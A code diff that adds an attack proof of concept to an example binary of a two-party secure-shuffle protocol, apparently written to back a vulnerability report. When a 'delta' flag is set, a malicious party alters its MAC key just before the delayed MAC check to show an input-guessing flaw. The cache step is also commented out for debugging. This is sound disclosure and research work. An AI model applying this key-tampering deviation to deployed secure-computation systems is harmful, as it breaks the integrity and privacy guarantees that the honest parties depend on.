@@ -1,3 +1,11 @@
+// Attack PoC for Input-Guessing Vulnerability in Song et al. NDSS'24 Shuffle
+//
+// This binary demonstrates the input-guessing attack by modifying the MAC key
+// after the shuffle phase but before NdssDelayCheck(). The honest party runs
+// the unmodified NDSS_online_example binary.
+//
+// See docs/SECURITY_VULNERABILITY_REPORT.md for details.
+
 #include <chrono>
 #include <future>
 #include <random>
@@ -40,12 +48,18 @@ llvm::cl::opt<uint32_t> cl_cache(
     llvm::cl::desc(
         "0 for no cache, 1 for cache (pre-compute offline randomness)"));
 
+// Attack-specific flags
+llvm::cl::opt<uint64_t> cl_delta(
+    "delta", llvm::cl::init(1),
+    llvm::cl::desc("Key modification delta for attack (0 = no attack)"));
+
 llvm::cl::opt<uint32_t> cl_input_mode(
     "input_mode", llvm::cl::init(0),
     llvm::cl::desc("0 = random inputs, 1 = all zeros"));
 
 auto NDSS_shuffle2k(const std::shared_ptr<yacl::link::Context> &lctx, size_t T,
-                    size_t num, bool CR_mode, bool cache, uint32_t input_mode) {
+                    size_t num, bool CR_mode, bool cache, uint64_t delta,
+                    uint32_t input_mode) {
   auto rank = lctx->Rank();
 
   SPDLOG_INFO("[P{}] T {} && num {}, working mode: {} && {} ", rank, T, num,
@@ -57,20 +71,30 @@ auto NDSS_shuffle2k(const std::shared_ptr<yacl::link::Context> &lctx, size_t T,
   SetupContext(context, CR_mode /* fake CR model or real CR model */);
 
   auto prot = context->GetState<Protocol>();
+  auto cr = context->GetState<Correlation>();
 
-  if (cache) {
-    auto shares = prot->RandA(num, true);
-    auto shuffle = prot->ShuffleA_2k(T, shares, true);
-    auto result = prot->A2P(shuffle, true);
+  SPDLOG_INFO("[P{}] Initial key: 0x{:016x}", rank, prot->GetKey().GetVal());
 
-    context->GetState<Correlation>()->force_cache();
-  }
+  // DISABLED FOR DEBUGGING: Skip cache to see exact correlation generation timing
+  // if (cache) {
+  //   SPDLOG_INFO("[P{}] === DRY RUN (cache sizing) ===", rank);
+  //   auto shares = prot->RandA(num, true);
+  //   auto shuffle = prot->ShuffleA_2k(T, shares, true);
+  //   auto result = prot->A2P(shuffle, true);
+  //
+  //   context->GetState<Correlation>()->force_cache();
+  //   SPDLOG_INFO("[P{}] Cache populated", rank);
+  // }
+  SPDLOG_INFO("[P{}] Cache DISABLED for debugging", rank);
 
-  std::vector<internal::ATy> shares;
+  // Generate input shares based on input_mode
+  std::vector<ATy> shares;
   if (input_mode == 0) {
+    // Random inputs
     shares = prot->RandA(num);
     SPDLOG_INFO("[P{}] Using RANDOM inputs", rank);
   } else {
+    // All zeros - use ZerosA
     shares = prot->ZerosA(num);
     SPDLOG_INFO("[P{}] Using ALL ZEROS inputs", rank);
   }
@@ -101,12 +125,41 @@ auto NDSS_shuffle2k(const std::shared_ptr<yacl::link::Context> &lctx, size_t T,
     auto conn = context->GetConnection();
     for (size_t i = 0; i < std::min((size_t)4, shuffle.size()); ++i) {
       auto remote_val = conn->Exchange(shuffle[i].val.GetVal());
-      auto reconstructed = shuffle[i].val + internal::PTy(remote_val);
+      auto reconstructed = shuffle[i].val + PTy(remote_val);
       SPDLOG_INFO("[P{}] shuffle[{}] reconstructed value = 0x{:016x}", rank, i, reconstructed.GetVal());
     }
   }
 
-  YACL_ENFORCE(prot->NdssDelayCheck());
+  // >>> ATTACK INJECTION POINT <<<
+  // At this point, the cache is exhausted. The RandA(1) call inside
+  // NdssDelayCheck() will trigger on-demand generation using the current key.
+  // By modifying the key now, we cause the new correlation to be authenticated
+  // with a different global MAC key than the buffered shares.
+  if (delta != 0) {
+    PTy original_key = prot->GetKey();
+    PTy new_key = original_key + PTy(delta);
+
+    SPDLOG_WARN("=== ATTACK ===");
+    SPDLOG_WARN("[ATTACK] Modifying key by delta = {}", delta);
+    SPDLOG_WARN("[ATTACK] Original key: 0x{:016x}", original_key.GetVal());
+    SPDLOG_WARN("[ATTACK] New key:      0x{:016x}", new_key.GetVal());
+
+    prot->SetKey(new_key);
+    cr->SetKey(new_key);
+
+    SPDLOG_WARN("[ATTACK] Key modification complete. Proceeding to MAC check.");
+  }
+
+  // MAC check - will fail if delta != 0 due to key mismatch
+  bool check_result = prot->NdssDelayCheck();
+
+  if (delta != 0) {
+    SPDLOG_WARN("[ATTACK] NdssDelayCheck result: {}",
+                check_result ? "PASS (unexpected!)" : "FAIL (expected)");
+  } else {
+    YACL_ENFORCE(check_result, "NdssDelayCheck failed with delta=0!");
+  }
+
   TIMER_N_COMM_END_PRINT(NDSS_shuffle_online);
 
   auto result = prot->A2P(shuffle);
@@ -175,10 +228,21 @@ int main(int argc, char **argv) {
   uint32_t big_power = cl_big.getValue();
   bool CR_mode = cl_CR.getValue();
   bool cache = cl_cache.getValue();
+  uint64_t delta = cl_delta.getValue();
+  uint32_t input_mode = cl_input_mode.getValue();
 
   YACL_ENFORCE(0 < small_power && small_power <= big_power);
   uint32_t T = 1 << small_power;
   uint32_t num = 1 << big_power;
+
+  SPDLOG_INFO("=== Attack PoC: Input-Guessing Vulnerability ===");
+  SPDLOG_INFO("Parameters: T={}, num={}, delta={}, input_mode={}", T, num, delta, input_mode);
+  if (delta != 0) {
+    SPDLOG_INFO("Mode: ATTACK (will modify key before MAC check)");
+  } else {
+    SPDLOG_INFO("Mode: HONEST (no attack, control experiment)");
+  }
+  SPDLOG_INFO("Inputs: {}", input_mode == 0 ? "RANDOM" : "ALL ZEROS");
 
   // lambda
   auto run_party = [&](uint32_t rank) {
@@ -186,7 +250,7 @@ int main(int argc, char **argv) {
     SyncTask(lctx, T, num, CR_mode, cache);
 
     SPDLOG_INFO("PROTOCOL START");
-    auto [shuffle, plaintext] = NDSS_shuffle2k(lctx, T, num, CR_mode, cache, cl_input_mode.getValue());
+    auto [shuffle, plaintext] = NDSS_shuffle2k(lctx, T, num, CR_mode, cache, delta, input_mode);
     SPDLOG_INFO("PROTOCOL END");
 
     typedef decltype(std::declval<internal::PTy>().GetVal()) INTEGER;
